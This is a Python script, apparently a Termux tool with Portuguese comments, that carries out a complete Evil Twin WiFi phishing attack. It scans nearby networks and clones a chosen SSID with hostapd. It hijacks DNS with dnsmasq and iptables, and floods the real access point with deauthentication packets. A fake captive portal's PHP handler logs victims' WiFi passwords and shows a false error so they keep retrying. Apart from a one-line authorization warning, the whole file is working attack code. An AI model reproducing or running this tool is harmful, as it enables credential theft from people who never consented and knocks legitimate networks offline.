#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import subprocess
import json
import re
import threading
from typing import Dict, List, Optional, Tuple

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.align import Align
from rich.markdown import Markdown

console = Console()

class EvilTwinAttack:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.fake_interface = None
        self.hostapd_conf = "/tmp/hostapd.conf"
        self.dnsmasq_conf = "/tmp/dnsmasq.conf"
        self.captive_portal_path = "/tmp/captive_portal"
        self.credentials_file = "/tmp/credentials.txt"
        
        self.banners = [
            self._gerar_banner_evil1(),
            self._gerar_banner_evil2(),
            self._gerar_banner_evil3()
        ]
    
    def _gerar_banner_evil1(self) -> str:
        return """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌
▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌
▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌
▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
[/bold red]
[bold white on red]        EVIL TWIN ATTACK - WIFI PHISHING[/bold white on red]
"""
    
    def _gerar_banner_evil2(self) -> str:
        return """
[bold yellow]
    ┌─┐┌─┐┬┌┐┌  ┌┬┐┬ ┬┌─┐  ┌┬┐┬┌┬┐┬ ┬
    │  ├─┤││││   │ ││││ │   │ ││ │ │││
    └─┘┴ ┴┴┘└┘   ┴ └┴┘└─┘   ┴ ┴┴ ┴└┴┘
    
    ╔═══════════════════════════════╗
    ║        WIFI CLONE ATTACK      ║
    ║      CAPTURE CREDENTIALS      ║
    ╚═══════════════════════════════╝
[/bold yellow]
[bold black on yellow]        EVIL TWIN - CREDENTIAL HARVESTING[/bold black on yellow]
"""
    
    def _gerar_banner_evil3(self) -> str:
        return """
[bold magenta]
  _____      _ _   _ _______ _   _ _____  
 |  ___|    | | \ | |_  / _ \ | | |  ___| 
 | |____  __| |  \| |/ / | | | | | | |____ 
 |  __\ \/ / | |\  |/ /| | | | | | |  __| 
 | |___>  <| | | | / /_| |_| | |_| | |___ 
 \____/_/\_\_|_| |_/____\___/ \___/\____/ 
                                           
  ____ _____ _   _ _   _ _____ ______ ____  
 |  _ \_   _| | | | \ | |_   _|  ____/ __ \ 
 | |_) || | | | | |  \| | | | | |__ | |  | |
 |  _ < | | | | | | . ` | | | |  __|| |  | |
 | |_) || |_| |_| | |\  |_| |_| |   | |__| |
 |____/_____\___/|_| \_|_____|_|    \____/ 
[/bold magenta]
[bold white on magenta]        ADVANCED EVIL TWIN ATTACK TOOL[/bold white on magenta]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS EM AMBIENTES CONTROLADOS E COM AUTORIZAÇÃO! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def verificar_root(self) -> bool:
        """Verifica se o usuário tem permissões root"""
        try:
            return os.geteuid() == 0
        except:
            return False
    
    def verificar_ferramentas(self) -> Dict[str, bool]:
        """Verifica se as ferramentas necessárias estão instaladas"""
        tools = {
            'aircrack-ng': False,
            'airodump-ng': False,
            'airmon-ng': False,
            'hostapd': False,
            'dnsmasq': False,
            'iptables': False,
            'python3': False,
            'php': False
        }
        
        for tool in tools.keys():
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, 
                              stderr=subprocess.DEVNULL, check=False)
                tools[tool] = True
            except (FileNotFoundError, subprocess.CalledProcessError):
                tools[tool] = False
        
        return tools
    
    def detectar_interfaces(self) -> List[str]:
        """Detecta interfaces wireless disponíveis"""
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
        except:
            pass
        
        return interfaces
    
    def escanear_redes(self, interface: str) -> List[Dict]:
        """Escaneia redes WiFi próximas"""
        redes = []
        
        try:
            # Colocar interface em modo monitor
            subprocess.run(['airmon-ng', 'check', 'kill'], check=False)
            subprocess.run(['airmon-ng', 'start', interface], check=False)
            self.monitor_interface = f"{interface}mon"
            
            # Escanear redes
            console.print("[yellow]Escaneando redes WiFi... (Ctrl+C para parar)[/yellow]")
            time.sleep(2)
            
            cmd = ['airodump-ng', '-w', '/tmp/wifi_scan', '--output-format', 'json', self.monitor_interface]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(10)
            process.terminate()
            
            # Ler resultados
            try:
                with open('/tmp/wifi_scan-01.json', 'r') as f:
                    data = json.load(f)
                    for ap in data.get('aps', []):
                        rede = {
                            'bssid': ap.get('bssid', ''),
                            'essid': ap.get('essid', 'Unknown'),
                            'channel': ap.get('channel', '0'),
                            'power': ap.get('power', '0'),
                            'encryption': ap.get('encryption', ''),
                            'clients': ap.get('stations', [])
                        }
                        redes.append(rede)
            except:
                pass
                
        except Exception as e:
            console.print(f"[red]Erro no scan: {str(e)}[/red]")
        
        return redes
    
    def selecionar_rede(self, redes: List[Dict]) -> Optional[Dict]:
        """Menu para selecionar uma rede alvo"""
        if not redes:
            console.print("[red]Nenhuma rede encontrada![/red]")
            return None
        
        tabela = Table(title="Redes WiFi Detectadas", show_header=True, header_style="bold magenta")
        tabela.add_column("#", style="cyan", width=5)
        tabela.add_column("SSID", style="green")
        tabela.add_column("BSSID", style="yellow")
        tabela.add_column("Canal", style="cyan")
        tabela.add_column("Potência", style="red")
        tabela.add_column("Criptografia", style="blue")
        tabela.add_column("Clientes", style="magenta")
        
        for i, rede in enumerate(redes, 1):
            num_clients = len(rede.get('clients', []))
            client_icon = "👥" if num_clients > 0 else "👤"
            tabela.add_row(
                str(i),
                rede['essid'],
                rede['bssid'],
                rede['channel'],
                rede['power'],
                rede['encryption'],
                f"{client_icon} {num_clients}"
            )
        
        console.print(tabela)
        
        try:
            escolha = IntPrompt.ask("Selecione a rede para clonar", default=1, show_default=True)
            if 1 <= escolha <= len(redes):
                return redes[escolha-1]
        except:
            pass
        
        return None
    
    def criar_portal_cativo(self):
        """Cria um portal cativo para phishing"""
        os.makedirs(self.captive_portal_path, exist_ok=True)
        
        # Página de login fake
        login_page = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login de Segurança da Rede</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 20px; }
                .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                h2 { color: #333; text-align: center; }
                .logo { text-align: center; margin-bottom: 20px; font-size: 24px; font-weight: bold; color: #0066cc; }
                input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
                button:hover { background: #0055aa; }
                .error { color: red; text-align: center; display: none; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🌐 Rede Segura</div>
                <h2>Autenticação Requerida</h2>
                <p>Por favor, insira a senha da rede WiFi para continuar:</p>
                <form method="POST" action="/login">
                    <input type="password" name="password" placeholder="Senha da rede" required>
                    <button type="submit">Conectar</button>
                </form>
                <p id="error" class="error">Senha incorreta. Tente novamente.</p>
            </div>
            <script>
                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.get('error')) {
                    document.getElementById('error').style.display = 'block';
                }
            </script>
        </body>
        </html>
        """
        
        # Script PHP para processar login
        php_script = """
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $password = $_POST['password'] ?? '';
            $ssid = $_GET['ssid'] ?? 'Unknown';
            
            if (!empty($password)) {
                $log = date('Y-m-d H:i:s') . " | SSID: $ssid | Password: $password\\n";
                file_put_contents('/tmp/credentials.txt', $log, FILE_APPEND);
                
                // Simular falha de autenticação para manter a vítima tentando
                header('Location: /?ssid=' . urlencode($ssid) . '&error=1');
                exit;
            }
        }
        ?>
        """
        
        with open(f"{self.captive_portal_path}/index.html", "w") as f:
            f.write(login_page)
        
        with open(f"{self.captive_portal_path}/login.php", "w") as f:
            f.write(php_script)
    
    def configurar_hostapd(self, ssid: str, channel: str):
        """Configura o hostapd para criar o AP fake"""
        config = f"""
interface={self.fake_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        with open(self.hostapd_conf, "w") as f:
            f.write(config)
    
    def configurar_dnsmasq(self):
        """Configura o dnsmasq para DHCP e DNS"""
        config = f"""
interface={self.fake_interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        with open(self.dnsmasq_conf, "w") as f:
            f.write(config)
    
    def configurar_redirecionamento(self):
        """Configura redirecionamento de tráfego"""
        try:
            # Configurar interface
            subprocess.run(['ifconfig', self.fake_interface, 'up'], check=True)
            subprocess.run(['ifconfig', self.fake_interface, '10.0.0.1', 'netmask', '255.255.255.0'], check=True)
            
            # Configurar iptables
            subprocess.run(['iptables', '--flush'], check=True)
            subprocess.run(['iptables', '--table', 'nat', '--flush'], check=True)
            subprocess.run(['iptables', '--delete-chain'], check=True)
            subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], check=True)
            
            # Redirecionar tráfego
            subprocess.run(['iptables', '-P', 'FORWARD', 'ACCEPT'], check=True)
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'], check=True)
            
            # Habilitar forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
                
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Erro na configuração de rede: {e}[/red]")
            return False
        return True
    
    def iniciar_servicos(self):
        """Inicia os serviços do evil twin"""
        try:
            # Iniciar dnsmasq
            dnsmasq_process = subprocess.Popen([
                'dnsmasq', '-C', self.dnsmasq_conf, '-d'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Iniciar hostapd
            hostapd_process = subprocess.Popen([
                'hostapd', self.hostapd_conf
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Iniciar servidor web PHP
            php_process = subprocess.Popen([
                'php', '-S', '10.0.0.1:80', '-t', self.captive_portal_path
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return dnsmasq_process, hostapd_process, php_process
            
        except Exception as e:
            console.print(f"[red]Erro ao iniciar serviços: {e}[/red]")
            return None, None, None
    
    def desativar_rede_original(self, bssid: str, channel: str):
        """Tenta desativar a rede original com deauthentication"""
        try:
            console.print("[yellow]Enviando pacotes de deauthentication...[/yellow]")
            deauth_process = subprocess.Popen([
                'aireplay-ng', '--deauth', '0', '-a', bssid, self.monitor_interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return deauth_process
        except Exception as e:
            console.print(f"[red]Erro no deauth: {e}[/red]")
            return None
    
    def monitorar_credenciais(self):
        """Monitora o arquivo de credenciais em tempo real"""
        console.print(Panel.fit(
            "[bold green]👁️ Monitorando credenciais...[/bold green]\n"
            "Pressione Ctrl+C para parar o ataque",
            border_style="green"
        ))
        
        last_size = 0
        try:
            while True:
                if os.path.exists(self.credentials_file):
                    current_size = os.path.getsize(self.credentials_file)
                    if current_size > last_size:
                        with open(self.credentials_file, "r") as f:
                            f.seek(last_size)
                            new_credentials = f.read()
                            console.print(f"[green]Nova credencial capturada:[/green] {new_credentials.strip()}")
                        last_size = current_size
                time.sleep(2)
        except KeyboardInterrupt:
            pass
    
    def executar_ataque(self, rede: Dict):
        """Executa o ataque Evil Twin completo"""
        self.target_bssid = rede['bssid']
        self.target_essid = rede['essid']
        self.target_channel = rede['channel']
        
        # Criar interface fake (usando a mesma interface em modo AP)
        self.fake_interface = self.interface
        
        console.print(Panel.fit(
            f"[bold]Iniciando Evil Twin Attack[/bold]\n"
            f"[cyan]Rede Alvo:[/cyan] {self.target_essid}\n"
            f"[cyan]BSSID:[/cyan] {self.target_bssid}\n"
            f"[cyan]Canal:[/cyan] {self.target_channel}",
            title="Configuração do Ataque"
        ))
        
        # Criar portal cativo
        console.print("[yellow]Criando portal cativo...[/yellow]")
        self.criar_portal_cativo()
        
        # Configurar hostapd
        console.print("[yellow]Configurando access point fake...[/yellow]")
        self.configurar_hostapd(self.target_essid, self.target_channel)
        
        # Configurar dnsmasq
        console.print("[yellow]Configurando servidor DHCP/DNS...[/yellow]")
        self.configurar_dnsmasq()
        
        # Configurar redirecionamento
        console.print("[yellow]Configurando redirecionamento...[/yellow]")
        if not self.configurar_redirecionamento():
            console.print("[red]Falha na configuração de rede![/red]")
            return False
        
        # Iniciar serviços
        console.print("[yellow]Iniciando serviços...[/yellow]")
        dnsmasq_process, hostapd_process, php_process = self.iniciar_servicos()
        
        if not all([dnsmasq_process, hostapd_process, php_process]):
            console.print("[red]Falha ao iniciar serviços![/red]")
            return False
        
        # Desativar rede original
        console.print("[yellow]Desativando rede original...[/yellow]")
        deauth_process = self.desativar_rede_original(self.target_bssid, self.target_channel)
        
        # Iniciar monitoramento de credenciais em thread separada
        monitor_thread = threading.Thread(target=self.monitorar_credenciais)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            console.print(Panel.fit(
                "[bold green]✅ EVIL TWIN ATIVO![/bold green]\n"
                "Vítimas serão redirecionadas para o portal de login\n"
                "Credenciais serão capturadas automaticamente",
                border_style="green"
            ))
            
            # Manter o script rodando
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Parando ataque...[/yellow]")
        
        finally:
            # Encerrar processos
            for process in [dnsmasq_process, hostapd_process, php_process, deauth_process]:
                if process:
                    process.terminate()
            
            # Limpar iptables
            subprocess.run(['iptables', '--flush'], check=False)
            subprocess.run(['iptables', '--table', 'nat', '--flush'], check=False)
            
            # Mostrar credenciais capturadas
            if os.path.exists(self.credentials_file):
                console.print(Panel.fit(
                    "[bold]Credenciais Capturadas:[/bold]",
                    border_style="cyan"
                ))
                with open(self.credentials_file, "r") as f:
                    console.print(f.read())
            
            return True
    
    def limpar_interface(self):
        """Limpa e restaura a interface wireless"""
        if self.monitor_interface:
            try:
                subprocess.run(['airmon-ng', 'stop', self.monitor_interface], check=False)
                subprocess.run(['service', 'network-manager', 'restart'], check=False)
            except:
                pass
    
    def executar(self):
        """Função principal de execução"""
        try:
            self.mostrar_banner()
            
            # Verificar root
            if not self.verificar_root():
                console.print(Panel.fit(
                    "[bold red]ERRO: Este script requer permissões root![/bold red]\n"
                    "Execute com: sudo python3 evil_twin.py",
                    border_style="red"
                ))
                return False
            
            # Verificar ferramentas
            console.print("[yellow]Verificando ferramentas...[/yellow]")
            tools = self.verificar_ferramentas()
            
            missing_tools = [tool for tool, available in tools.items() if not available]
            if missing_tools:
                console.print(Panel.fit(
                    f"[red]Ferramentas faltando: {', '.join(missing_tools)}[/red]\n"
                    "Instale com: sudo apt install aircrack-ng hostapd dnsmasq php",
                    border_style="red"
                ))
                return False
            
            # Detectar interfaces
            interfaces = self.detectar_interfaces()
            if not interfaces:
                console.print("[red]Nenhuma interface wireless encontrada![/red]")
                return False
            
            console.print(Panel.fit(
                f"[green]Interfaces detectadas: {', '.join(interfaces)}[/green]",
                title="Interfaces Wireless"
            ))
            
            self.interface = Prompt.ask(
                "Selecione a interface",
                choices=interfaces,
                default=interfaces[0]
            )
            
            # Escanear redes
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True
            ) as progress:
                progress.add_task("Escaneando redes WiFi...", total=None)
                redes = self.escanear_redes(self.interface)
            
            if not redes:
                console.print("[red]Nenhuma rede WiFi encontrada![/red]")
                self.limpar_interface()
                return False
            
            # Selecionar rede alvo
            rede_alvo = self.selecionar_rede(redes)
            if not rede_alvo:
                self.limpar_interface()
                return False
            
            # Confirmar ataque
            console.print(Panel.fit(
                f"[bold red]⚠️ ALVO SELECIONADO ⚠️[/bold red]\n"
                f"[bold]SSID:[/bold] {rede_alvo['essid']}\n"
                f"[bold]BSSID:[/bold] {rede_alvo['bssid']}\n"
                f"[bold]Clientes:[/bold] {len(rede_alvo.get('clients', []))}",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar ataque Evil Twin?", default=False):
                console.print("[yellow]Ataque cancelado![/yellow]")
                self.limpar_interface()
                return False
            
            # Executar ataque
            sucesso = self.executar_ataque(rede_alvo)
            
            # Limpar
            self.limpar_interface()
            
            if sucesso:
                console.print(Panel.fit(
                    "[bold green]✅ ATAQUE CONCLUÍDO![/bold green]",
                    border_style="green"
                ))
            else:
                console.print(Panel.fit(
                    "[bold red]❌ ATAQUE FALHOU[/bold red]",
                    border_style="red"
                ))
            
            return sucesso
            
        except KeyboardInterrupt:
            console.print("\n[yellow]Script interrompido pelo usuário[/yellow]")
            self.limpar_interface()
            return False
        except Exception as e:
            console.print(f"\n[red]Erro inesperado: {str(e)}[/red]")
            self.limpar_interface()
            return False

def main():
    attack = EvilTwinAttack()
    attack.executar()

if __name__ == '__main__':
    main()
